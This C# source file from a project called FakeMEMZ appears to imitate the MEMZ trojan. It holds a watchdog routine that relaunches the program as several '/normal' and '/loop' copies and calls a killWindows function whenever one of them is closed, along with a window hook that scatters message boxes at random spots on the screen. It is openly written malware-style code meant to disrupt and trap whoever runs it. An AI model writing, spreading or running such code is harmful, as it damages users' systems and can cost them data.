using System;
using static FakeMEMZ.WinAPI;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace FakeMEMZ
{
    internal class utils
    {
        public delegate void SetProcDPI();
        public static void DPI()
        {
            try
            {
                IntPtr hModule = LoadLibrary("user32.dll");
                IntPtr funcPtr = GetProcAddress(hModule, "SetProcessDPIAware");

                SetProcDPI SetProcessDPIAware = (SetProcDPI)Marshal.GetDelegateForFunctionPointer(funcPtr, typeof(SetProcDPI));

                SetProcessDPIAware();

                FreeLibrary(hModule);
            }
            catch { }
        }

        public static void PayloadsStart(ThreadStart thread)
        {
            new Thread(new ThreadStart(thread)).Start();
        }
        public static string StrReverse(string text)
        {
            char[] charArray = text.ToCharArray();
            string reverse = String.Empty;
            for (int i = charArray.Length - 1; i >= 0; i--)
            {
                reverse += charArray[i];
            }
            return reverse;
        }
        public void MEMZ_PROC()
        {
            Process MEMZ1 = new Process();
            MEMZ1.StartInfo.FileName = Application.ExecutablePath; ;
            MEMZ1.StartInfo.Arguments = "/normal";
            MEMZ1.SynchronizingObject = null;
            MEMZ1.EnableRaisingEvents = true;
            MEMZ1.Exited += new EventHandler(MEMZ1_Exited);
            MEMZ1.Start();

            for (int a = 0; a < 3; a++)
            {
                Process MEMZ2 = new Process();
                MEMZ2.StartInfo.FileName = Application.ExecutablePath; ;
                MEMZ2.StartInfo.Arguments = "/loop";
                MEMZ2.SynchronizingObject = null;
                MEMZ2.EnableRaisingEvents = true;
                MEMZ2.Exited += new EventHandler(MEMZ2_Exited);
                MEMZ2.Start();
            }
            for(; ; )
            { }
        }
        private void MEMZ1_Exited(object sender, EventArgs e)
        {
            main.killWindows();
        }
        private void MEMZ2_Exited(object sender, EventArgs e)
        {
            main.killWindows();
        }
    }
    
    public class MsgBox1
    {
        private IWin32Window m_ownerWindow = null;
        private IntPtr m_hHook = (IntPtr)0;
        /// <param name="owner"></param>
        /// <param name="messageBoxText"></param>
        /// <param name="caption"></param>
        /// <param name="button"></param>
        /// <param name="icon"></param>
        /// <returns></returns>
        public static DialogResult Show(
            IWin32Window owner,
            string messageBoxText,
            string caption,
            MessageBoxButtons button,
            MessageBoxIcon icon)
        {
            MsgBox1 mbox = new MsgBox1(owner);
            return mbox.Show(messageBoxText, caption, button, icon);
        }
        /// <summary>
        /// コンストラクタ
        /// </summary>
        /// <param name="window">親ウィンドウ</param>
        private MsgBox1(IWin32Window window)
        {
            m_ownerWindow = window;
        }

        /// <summary>
        /// メッセージボックスを表示する
        /// </summary>
        /// <param name="messageBoxText"></param>
        /// <param name="caption"></param>
        /// <param name="button"></param>
        /// <param name="icon"></param>
        /// <returns></returns>
        private DialogResult Show(
            string messageBoxText,
            string caption,
            MessageBoxButtons button,
            MessageBoxIcon icon)
        {
            // フックを設定する。
            IntPtr hInstance = WinAPI.GetWindowLong(m_ownerWindow.Handle, WinAPI.GWL_HINSTANCE);
            IntPtr threadId = WinAPI.GetCurrentThreadId();
            m_hHook = WinAPI.SetWindowsHookEx(WinAPI.WH_CBT, new WinAPI.HOOKPROC(HookProc), hInstance, threadId);

            return System.Windows.Forms.MessageBox.Show(m_ownerWindow, messageBoxText, caption, button, icon);
        }

        /// <summary>
        /// フックプロシージャ
        /// </summary>
        /// <param name="nCode"></param>
        /// <param name="wParam"></param>
        /// <param name="lParam"></param>
        /// <returns></returns>
        private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (nCode == WinAPI.HCBT_ACTIVATE)
            {
                WinAPI.RECT rcForm = new WinAPI.RECT(0, 0, 0, 0);
                WinAPI.RECT rcMsgBox = new WinAPI.RECT(0, 0, 0, 0);

                WinAPI.GetWindowRect(m_ownerWindow.Handle, out rcForm);
                WinAPI.GetWindowRect(wParam, out rcMsgBox);

                //ランダムな位置を計算
                Random random = new Random();
                int x = random.Next(0, Screen.PrimaryScreen.Bounds.Width);
                int y = random.Next(0, Screen.PrimaryScreen.Bounds.Height);

                WinAPI.SetWindowPos(wParam, 0, x, y, 0, 0, WinAPI.SWP_NOSIZE | WinAPI.SWP_NOZORDER | WinAPI.SWP_NOACTIVATE);

                IntPtr result = WinAPI.CallNextHookEx(m_hHook, nCode, wParam, lParam);

                // フックを解除する。
                WinAPI.UnhookWindowsHookEx(m_hHook);
                m_hHook = (IntPtr)0;

                return result;

            }
            else
            {
                return WinAPI.CallNextHookEx(m_hHook, nCode, wParam, lParam);
            }
        }
    }
}
